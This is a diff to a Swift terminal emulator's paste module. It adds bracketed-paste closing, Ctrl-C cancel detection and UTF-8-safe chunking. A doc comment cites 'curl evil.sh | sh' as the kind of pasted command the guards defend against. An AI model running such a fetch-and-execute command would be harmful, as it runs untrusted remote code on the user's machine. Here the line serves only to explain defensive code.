@@ -22,8 +22,8 @@ import Foundation
 /// (`curl evil.sh | sh`). `nonisolated` so it is testable.
 nonisolated enum Paste {
     /// The ?2004 markers.
-    private static let bracketStart: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x30, 0x7E]
-    private static let bracketEnd: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x31, 0x7E]
+    static let bracketStart: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x30, 0x7E]
+    static let bracketEnd: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x31, 0x7E]
 
     /// Strips C0 except tab, LF and CR (newlines are guarded by the warning),
     /// DEL and C1. DEL is a line editor's backspace, so a pasted one erased
@@ -45,6 +45,38 @@ nonisolated enum Paste {
         // CRLF is one Swift Character; matching individual Characters misses
         // it. The child receives bytes, so inspect the scalar representation.
         !bracketedPasteEnabled && text.unicodeScalars.contains { $0.value == 10 || $0.value == 13 }
+    }
+
+    /// What ends a paste for the child: the closing marker when bracketed.
+    /// A cancelled paste the child started reading is closed with it, or the
+    /// shell stays in paste mode (`TerminalSession.write(paste:closing:)`).
+    static func closing(bracketedPasteEnabled: Bool) -> [UInt8]? {
+        bracketedPasteEnabled ? bracketEnd : nil
+    }
+
+    /// Ctrl-C as the pane sends it — the kitty protocol's `disambiguate`
+    /// leaves it legacy — and the keystroke that cancels a paste still
+    /// queued ahead of it.
+    static func isInterrupt(_ bytes: [UInt8]) -> Bool {
+        bytes == [0x03]
+    }
+
+    /// A paste as the session queues it: the text in chunks that never cut a
+    /// UTF-8 character, the opening marker on the first, and the closing
+    /// marker — with `trailer`, a Return — as a chunk of its own. A cancel
+    /// between chunks then never splits a character or a marker.
+    static func chunks(
+        for text: String, bracketedPasteEnabled: Bool, trailer: [UInt8] = [],
+        maxChunkSize: Int = defaultChunkSize
+    ) -> [[UInt8]] {
+        var chunks = chunked(Array(text.utf8), maxChunkSize: maxChunkSize)
+        if bracketedPasteEnabled {
+            if chunks.isEmpty { chunks = [bracketStart] } else { chunks[0] = bracketStart + chunks[0] }
+            chunks.append(bracketEnd + trailer)
+        } else if !trailer.isEmpty {
+            chunks.append(trailer)
+        }
+        return chunks
     }
 
     /// Wrapped in the ?2004 markers when bracketed, so it reads as data.
@@ -70,6 +102,8 @@ nonisolated enum Paste {
     static let defaultChunkSize = 64 * 1024
 
     /// In-order chunks; empty in, none out; a non-positive size yields one.
+    /// A cut lands before a UTF-8 lead byte, never inside a character, unless
+    /// a whole chunk is continuation bytes (not UTF-8 anyway).
     static func chunked(_ bytes: [UInt8], maxChunkSize: Int = defaultChunkSize) -> [[UInt8]] {
         guard !bytes.isEmpty else { return [] }
         guard maxChunkSize > 0 else { return [bytes] }
@@ -77,7 +111,12 @@ nonisolated enum Paste {
         chunks.reserveCapacity((bytes.count + maxChunkSize - 1) / maxChunkSize)
         var offset = 0
         while offset < bytes.count {
-            let end = min(offset + maxChunkSize, bytes.count)
+            var end = min(offset + maxChunkSize, bytes.count)
+            var boundary = end
+            while boundary > offset, boundary < bytes.count, bytes[boundary] & 0xC0 == 0x80 {
+                boundary -= 1
+            }
+            if boundary > offset { end = boundary }
             chunks.append(Array(bytes[offset..<end]))
             offset = end
         }
